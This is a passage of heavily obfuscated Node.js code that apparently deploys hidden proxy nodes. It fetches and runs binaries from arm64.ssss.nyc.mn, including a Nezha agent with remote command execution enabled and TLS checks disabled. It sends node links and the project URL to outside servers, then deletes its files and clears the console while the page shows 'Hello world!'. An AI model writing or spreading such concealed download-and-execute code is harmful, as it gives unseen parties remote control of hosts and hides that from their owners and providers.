0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','aarch64','stringify','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/v1','util','20LdWWeT','Hello\x20world!','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_PORT','basename','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','text/plain;\x20charset=utf-8','quic','\x20is\x20running','/api/add-subscriptions','status','close','floor','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tls','?encryption=none&security=tls&sni=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','includes','Download\x20','ARGO_DOMAIN:','Error\x20in\x20startserver:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','250778QZIkdM','response','CFPORT','2053','data','block','\x20failed:\x20','\x0a\x20\x20\x20\x20','success','blackhole','readdirSync','error','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Nodes\x20uploaded\x20successfully','2083','\x22\x20>\x20/dev/null\x202>&1','chmod','Content-Type','145674ehgSHg','ARGO_AUTH','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Empowerment\x20success\x20for\x20','amd','.exe\x20>\x20nul\x202>&1','\x0a\x0atrojan://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','del\x20/f\x20/q\x20','/vmess-argo','stream','Error\x20reading\x20boot.log:','\x20-c\x20','vless','--tls','/dev/null','existsSync','unlink','\x20>/dev/null\x202>&1\x20&','from','none','clear','\x20-s\x20','fileName','ARGO_PORT','platform','child_process','/vless-argo','charAt','automatic\x20access\x20task\x20added\x20successfully','readFileSync','path','random','post','1178478xKWhCJ','ArgoDomain:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','substring','writeFileSync','Subscription\x20uploaded\x20successfully','config.yaml','\x20is\x20created','utf-8','/vmess-argo?ed=2560','App\x20is\x20running','UUID','bestcf.top','split','Error\x20executing\x20command:\x20','http','base64','filter','forEach','nohup\x20','/api/add-nodes','&fp=firefox&type=ws&host=','axios','\x20-p\x20','isFile','application/json','statSync','set','pop','NEZHA_KEY','taskkill\x20/f\x20/im\x20','PORT','env','countryCode','1052ctEfzy','pkill\x20-f\x20\x22[','fileUrl','arm','direct','Unhandled\x20error\x20in\x20startserver:','1699423LYZdpj','AUTO_ACCESS'];_0x4942=function(){return _0x2cdac9;};return _0x4942();}async function uploadNodes(){const _0x573e00={_0xb8ccbd:0x129,_0x483af9:0xa5,_0xa3ccd0:0x6d,_0x57c766:0x6d,_0x4d3512:0x9c,_0x230726:0xa8,_0x32f88a:0xe4,_0x53cd6c:0x11c,_0x3f8032:0x9f,_0x2af847:0xb4,_0x4f1de4:0xb9,_0xa038b1:0x79},_0x5eaa4a=_0x535bf7;if(UPLOAD_URL&&PROJECT_URL){const _0x32626c=PROJECT_URL+'/'+SUB_PATH,_0x56b2fb={'subscription':[_0x32626c]};try{const _0x59b183=await axios[_0x5eaa4a(0x9f)](UPLOAD_URL+_0x5eaa4a(_0x573e00._0xb8ccbd),_0x56b2fb,{'headers':{'Content-Type':'application/json'}});return _0x59b183&&_0x59b183[_0x5eaa4a(0x12a)]===0xc8?(console['log'](_0x5eaa4a(_0x573e00._0x483af9)),_0x59b183):null;}catch(_0x4895e2){if(_0x4895e2[_0x5eaa4a(_0x573e00._0xa3ccd0)]){if(_0x4895e2[_0x5eaa4a(_0x573e00._0x57c766)][_0x5eaa4a(0x12a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1b6958=fs[_0x5eaa4a(_0x573e00._0x4d3512)](listPath,_0x5eaa4a(_0x573e00._0x230726)),_0x4a00f2=_0x1b6958[_0x5eaa4a(0xad)]('\x0a')[_0x5eaa4a(0xb1)](_0x118350=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x118350));if(_0x4a00f2[_0x5eaa4a(_0x573e00._0x32f88a)]===0x0)return;const _0x5ea56a=JSON[_0x5eaa4a(_0x573e00._0x53cd6c)]({'nodes':_0x4a00f2});try{const _0x453604=await axios[_0x5eaa4a(_0x573e00._0x3f8032)](UPLOAD_URL+_0x5eaa4a(_0x573e00._0x2af847),_0x5ea56a,{'headers':{'Content-Type':_0x5eaa4a(_0x573e00._0x4f1de4)}});return _0x453604&&_0x453604['status']===0xc8?(console[_0x5eaa4a(0x10a)](_0x5eaa4a(_0x573e00._0xa038b1)),_0x453604):null;}catch(_0x39df5a){return null;}}else return;}}function cleanFiles(){const _0x1d3f16={_0x5631c7:0x106,_0x146a3b:0x97,_0x4d944b:0x86},_0x2aac5c={_0x4008b3:0x10a,_0x2246ef:0xaa};setTimeout(()=>{const _0x38ca10={_0x193a10:0xf8},_0x15b0dc=_0x709e,_0x59d5eb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x59d5eb['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x59d5eb[_0x15b0dc(_0x1d3f16._0x5631c7)](phpPath);process[_0x15b0dc(_0x1d3f16._0x146a3b)]==='win32'?exec(_0x15b0dc(_0x1d3f16._0x4d944b)+_0x59d5eb[_0x15b0dc(0xf4)]('\x20')+'\x20>\x20nul\x202>&1',_0x3debcc=>{const _0x3b6a31=_0x15b0dc;console['clear'](),console[_0x3b6a31(_0x2aac5c._0x4008b3)](_0x3b6a31(_0x2aac5c._0x2246ef)),console[_0x3b6a31(_0x2aac5c._0x4008b3)](_0x3b6a31(0xf8));}):exec('rm\x20-rf\x20'+_0x59d5eb['join']('\x20')+'\x20>/dev/null\x202>&1',_0x890610=>{const _0x4454d3=_0x15b0dc;console[_0x4454d3(0x93)](),console[_0x4454d3(0x10a)]('App\x20is\x20running'),console[_0x4454d3(0x10a)](_0x4454d3(_0x38ca10._0x193a10));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xef45bb={_0x41288c:0x111,_0x5174e3:0xb9,_0x21197a:0x10a,_0x4032b7:0x77,_0x4505c0:0x100},_0x25fb3f=_0x535bf7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x25fb3f(0x10a)](_0x25fb3f(_0xef45bb._0x41288c));return;}try{const _0x478729=await axios[_0x25fb3f(0x9f)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x25fb3f(_0xef45bb._0x5174e3)}});return console[_0x25fb3f(_0xef45bb._0x21197a)](_0x25fb3f(0x9b)),_0x478729;}catch(_0xcf93e5){return console[_0x25fb3f(_0xef45bb._0x4032b7)](_0x25fb3f(_0xef45bb._0x4505c0)+_0xcf93e5['message']),null;}}async function startserver(){const _0x23a3f8={_0x1cdc8b:0x77},_0x2d9f41=_0x535bf7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xe54455){console[_0x2d9f41(_0x23a3f8._0x1cdc8b)](_0x2d9f41(0x6a),_0xe54455);}}startserver()['catch'](_0x276316=>{const _0x22b7d2=_0x535bf7;console['error'](_0x22b7d2(0xc7),_0x276316);}),app['listen'](PORT,()=>console[_0x535bf7(0x10a)](_0x535bf7(0xdf)+PORT+'!'));
